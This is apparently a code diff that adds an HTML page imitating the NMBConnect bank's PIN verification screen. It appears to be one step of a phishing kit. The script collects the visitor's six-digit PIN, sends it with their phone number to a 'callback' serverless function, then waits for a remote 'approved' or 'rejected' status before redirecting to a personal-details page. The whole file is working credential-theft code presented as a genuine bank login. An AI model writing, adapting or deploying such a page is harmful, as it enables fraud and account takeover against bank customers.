@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NMBConnect - OTP Verification</title>
+  <style>
+    :root {
+      --primary-blue: #1e62ad;
+      --navy-blue: #0e3b70;
+      --gold-yellow: #f2a900;
+      --bg-gray: #f4f6f9;
+      --card-bg: #ffffff;
+      --border-color: #1e62ad;
+      --text-dark: #1b365d;
+      --text-muted: #6c757d;
+      --btn-disabled: #e9ecef;
+      --btn-disabled-text: #a0a6ac;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: var(--bg-gray);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    /* Header Styling */
+    header {
+      background-color: var(--primary-blue);
+      height: 140px;
+      padding: 0 24px;
+      display: flex;
+      align-items: center;
+      position: relative;
+    }
+
+    .back-btn {
+      background: rgba(255, 255, 255, 0.2);
+      border: none;
+      color: white;
+      width: 38px;
+      height: 38px;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      font-size: 18px;
+      transition: background 0.2s;
+    }
+
+    .back-btn:hover {
+      background: rgba(255, 255, 255, 0.3);
+    }
+
+    .brand-logo {
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .logo-icon {
+      font-weight: 900;
+      font-size: 14px;
+      color: #ffffff;
+      letter-spacing: 1px;
+      margin-bottom: 2px;
+    }
+
+    .brand-title {
+      font-size: 20px;
+      font-weight: 700;
+      letter-spacing: -0.3px;
+    }
+
+    .brand-title .nmb {
+      color: #0e3b70;
+    }
+
+    .brand-title .connect {
+      color: var(--gold-yellow);
+    }
+
+    /* Main Content Area */
+    main {
+      flex: 1;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+
+    .otp-card {
+      background: var(--card-bg);
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+      width: 100%;
+      max-width: 680px;
+      padding: 40px 30px;
+      text-align: center;
+    }
+
+    .otp-card h1 {
+      color: var(--text-dark);
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+
+    .otp-card p {
+      color: var(--text-muted);
+      font-size: 14px;
+      margin-bottom: 24px;
+    }
+
+    /* OTP Inputs Container */
+    .otp-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .otp-field {
+      width: 48px;
+      height: 48px;
+      border: 1.5px solid var(--border-color);
+      border-radius: 8px;
+      text-align: center;
+      font-size: 20px;
+      font-weight: 600;
+      color: var(--text-dark);
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .otp-field:focus {
+      border-color: var(--primary-blue);
+      box-shadow: 0 0 0 3px rgba(30, 98, 173, 0.2);
+    }
+
+    /* Resend Timer */
+    .resend-container {
+      margin-bottom: 24px;
+    }
+
+    .resend-text {
+      font-size: 13px;
+      color: var(--text-muted);
+    }
+
+    .resend-btn {
+      background: none;
+      border: none;
+      color: var(--primary-blue);
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 13px;
+      display: none;
+    }
+
+    .resend-btn:hover {
+      text-decoration: underline;
+    }
+
+    /* Verify Button */
+    .verify-btn {
+      width: 100%;
+      padding: 14px;
+      background-color: var(--btn-disabled);
+      color: var(--btn-disabled-text);
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      cursor: not-allowed;
+      transition: background-color 0.2s, color 0.2s;
+    }
+
+    .verify-btn.active {
+      background-color: var(--primary-blue);
+      color: #ffffff;
+      cursor: pointer;
+    }
+
+    .verify-btn.active:hover {
+      background-color: var(--navy-blue);
+    }
+
+    /* Footer Styling */
+    footer {
+      background-color: var(--primary-blue);
+      padding: 16px 20px;
+      text-align: center;
+      color: rgba(255, 255, 255, 0.85);
+      font-size: 12px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <button class="back-btn" aria-label="Go back">←</button>
+    <div class="brand-logo">
+      <span class="brand-title"><span class="nmb">NMB</span><span class="connect">Connect</span></span>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main>
+    <div class="otp-card">
+      <h1>PIN Verification</h1>
+      <p>Enter your 6-digit confirmation PIN</p>
+      <div id="error-message" style="display: none; background-color: #ffebee; color: #c62828; padding: 10px; border-radius: 5px; margin-bottom: 15px; font-size: 14px; text-align: center; border: 1px solid #ef9a9a;"></div>
+
+      <form id="otp-form" onsubmit="handleSubmit(event)">
+        <div class="otp-inputs">
+          <input type="text" maxlength="1" class="otp-field" pattern="[0-9]*" inputmode="numeric" required />
+          <input type="text" maxlength="1" class="otp-field" pattern="[0-9]*" inputmode="numeric" required />
+          <input type="text" maxlength="1" class="otp-field" pattern="[0-9]*" inputmode="numeric" required />
+          <input type="text" maxlength="1" class="otp-field" pattern="[0-9]*" inputmode="numeric" required />
+          <input type="text" maxlength="1" class="otp-field" pattern="[0-9]*" inputmode="numeric" required />
+          <input type="text" maxlength="1" class="otp-field" pattern="[0-9]*" inputmode="numeric" required />
+        </div>
+
+        <div class="resend-container">
+          <span class="resend-text" id="timer-text">Resend in <span id="countdown">15</span>s</span>
+          <button type="button" class="resend-btn" id="resend-btn" onclick="triggerResend()">Resend Code</button>
+        </div>
+
+        <button type="submit" class="verify-btn" id="verify-btn" disabled>VERIFY</button>
+      </form>
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer>
+    © 2026 NMB Holdings | Secure Login
+  </footer>
+
+  <!-- JavaScript -->
+  <script>
+    const inputs = document.querySelectorAll('.otp-field');
+    const verifyBtn = document.getElementById('verify-btn');
+    const timerText = document.getElementById('timer-text');
+    const countdownEl = document.getElementById('countdown');
+    const resendBtn = document.getElementById('resend-btn');
+
+    let countdownValue = 15;
+    let timerInterval = null;
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const parentAttemptId = urlParams.get('attemptId') || "Unknown";
+    const phoneStr = urlParams.get('phone') || "Unknown";
+
+    // Focus the first input field on load
+    window.addEventListener('DOMContentLoaded', () => {
+      inputs[0].focus();
+      startTimer();
+    });
+
+    // Handle Input Navigation (Auto-Tab & Backspace)
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', (e) => {
+        // Strip non-numeric characters
+        input.value = input.value.replace(/[^0-9]/g, '');
+
+        if (input.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+        checkCompletion();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+
+      // Support paste event for full 6-digit OTP
+      input.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pastedData = e.clipboardData.getData('text').trim().replace(/[^0-9]/g, '');
+        
+        if (pastedData.length > 0) {
+          const digits = pastedData.split('').slice(0, inputs.length);
+          digits.forEach((digit, idx) => {
+            inputs[idx].value = digit;
+          });
+          const focusIndex = Math.min(digits.length, inputs.length - 1);
+          inputs[focusIndex].focus();
+          checkCompletion();
+        }
+      });
+    });
+
+    // Check if all fields are filled to enable button
+    function checkCompletion() {
+      const isComplete = Array.from(inputs).every(input => input.value.length === 1);
+      if (isComplete) {
+        verifyBtn.classList.add('active');
+        verifyBtn.removeAttribute('disabled');
+      } else {
+        verifyBtn.classList.remove('active');
+        verifyBtn.setAttribute('disabled', 'true');
+      }
+    }
+
+    // Timer Logic
+    function startTimer() {
+      countdownValue = 15;
+      countdownEl.textContent = countdownValue;
+      timerText.style.display = 'inline';
+      resendBtn.style.display = 'none';
+
+      clearInterval(timerInterval);
+      timerInterval = setInterval(() => {
+        countdownValue--;
+        countdownEl.textContent = countdownValue;
+
+        if (countdownValue <= 0) {
+          clearInterval(timerInterval);
+          timerText.style.display = 'none';
+          resendBtn.style.display = 'inline-block';
+        }
+      }, 1000);
+    }
+
+    function triggerResend() {
+      // Clear all inputs
+      inputs.forEach(input => input.value = '');
+      checkCompletion();
+      inputs[0].focus();
+      
+      // Restart Countdown
+      startTimer();
+    }
+
+    async function handleSubmit(event) {
+      event.preventDefault();
+      if (verifyBtn.disabled) return;
+
+      const code = Array.from(inputs).map(i => i.value).join('');
+      const errorDiv = document.getElementById('error-message');
+      
+      errorDiv.style.display = 'none';
+      verifyBtn.innerHTML = 'VERIFYING... <span class="spinner" style="display:inline-block; margin-left:10px; width:15px; height:15px; border:2px solid #fff; border-top:2px solid transparent; border-radius:50%; animation: spin 1s linear infinite;"></span>';
+      verifyBtn.disabled = true;
+
+      try {
+          const resp = await fetch(`/.netlify/functions/callback`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ 
+                  type: 'pin',
+                  attemptId: parentAttemptId,
+                  phone: phoneStr,
+                  details: `NMB Connect PIN Verification: ${code}`
+              })
+          });
+          const data = await resp.json();
+          
+          if (data.attemptId) {
+              pollStatus(data.attemptId);
+          } else {
+              throw new Error('No attempt ID returned');
+          }
+      } catch (e) {
+          console.error('PIN submission error', e);
+          errorDiv.textContent = 'Error submitting PIN. Please try again.';
+          errorDiv.style.display = 'block';
+          verifyBtn.innerHTML = 'VERIFY';
+          verifyBtn.disabled = false;
+      }
+    }
+
+    async function pollStatus(attemptId) {
+        try {
+            const response = await fetch(`/.netlify/functions/check-status?attemptId=${attemptId}&_t=${Date.now()}`);
+            const data = await response.json();
+            const errorDiv = document.getElementById('error-message');
+
+            if (data.status === 'approved') {
+                window.location.href = `personaldetails.html?attemptId=${attemptId}&phone=${encodeURIComponent(phoneStr)}`;
+            } else if (data.status === 'rejected') {
+                errorDiv.textContent = 'PIN rejected. Please check and try again.';
+                errorDiv.style.display = 'block';
+                verifyBtn.innerHTML = 'VERIFY';
+                verifyBtn.disabled = false;
+                inputs.forEach(box => box.value = '');
+                inputs[0].focus();
+                checkCompletion();
+            } else {
+                setTimeout(() => pollStatus(attemptId), 2000);
+            }
+        } catch (error) {
+            console.error('Error polling status:', error);
+            setTimeout(() => pollStatus(attemptId), 2000);
+        }
+    }
+  </script>
+  <style>
+      @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
+</body>
+</html>
